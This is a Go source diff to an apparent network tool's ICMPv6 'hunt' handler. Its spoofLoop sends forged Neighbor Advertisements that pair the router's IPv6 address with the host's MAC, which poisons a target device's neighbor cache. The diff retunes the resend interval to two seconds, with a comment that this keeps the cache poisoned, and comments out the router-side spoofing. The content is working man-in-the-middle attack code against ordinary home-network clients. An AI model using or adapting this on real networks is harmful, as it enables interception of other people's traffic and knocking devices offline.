@@ -49,9 +49,6 @@ func (h *Handler) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
 //   2. optionally, claim the ownership of the IP to force client to change IP or go offline
 //
 func (h *Handler) spoofLoop(dstAddr packet.Addr) {
-	// Tplink home router send RA every 3 seconds
-	// 1 second re-do seem to be adequate;
-	ticker := time.NewTicker(time.Second * 1).C
 	startTime := time.Now()
 	nTimes := 0
 	fmt.Printf("icmp6 : na attack ip=%s time=%v\n", dstAddr.IP, startTime)
@@ -74,19 +71,19 @@ func (h *Handler) spoofLoop(dstAddr packet.Addr) {
 			h.Unlock()
 
 			for _, routerAddr := range list {
+
 				// spoof host
-				//
 				host := packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: h.session.NICInfo.HostLLA.IP}
 				targetAddr := packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: routerAddr.IP}
 				fakeRouter := packet.Addr{MAC: host.MAC, IP: routerAddr.IP}
-				// dst := packet.Addr{MAC: dstAddr.MAC, IP: packet.IP6AllNodesMulticast}
 				if err := h.SendNeighborAdvertisement(fakeRouter, dstAddr, targetAddr); err != nil {
 					fmt.Println("icmp6 : error sending na ", err)
 				}
-				/*
-					if err := h.SendNeighbourSolicitation(fakeRouter, dst, dstAddr.IP); err != nil {
-						fmt.Println("icmp6 : error sending na ", err)
-					}
+
+				/* no need to send this - May 21
+				if err := h.SendNeighbourSolicitation(fakeRouter, dst, dstAddr.IP); err != nil {
+					fmt.Println("icmp6 : error sending na ", err)
+				}
 				*/
 
 				if nTimes%16 == 0 {
@@ -94,11 +91,13 @@ func (h *Handler) spoofLoop(dstAddr packet.Addr) {
 				}
 				nTimes++
 
+				/***
 				// spoof router
 				targetAddr.IP = dstAddr.IP
 				if err := h.SendNeighborAdvertisement(host, routerAddr, targetAddr); err != nil {
 					fmt.Println("icmp6 : error sending na ", err)
 				}
+				***/
 			}
 		} else {
 			h.Unlock()
@@ -110,7 +109,11 @@ func (h *Handler) spoofLoop(dstAddr packet.Addr) {
 
 		select {
 		case <-h.closeChan:
-		case <-ticker:
+			// Tplink home router send RA every 3 seconds
+			// Note: when processing a RA message, we close the channel to wakeup all go routines
+
+		case <-time.After(time.Second * 2):
+			// 2 second spoof seem to be adequate to keep cache poisoned
 		}
 	}
 }
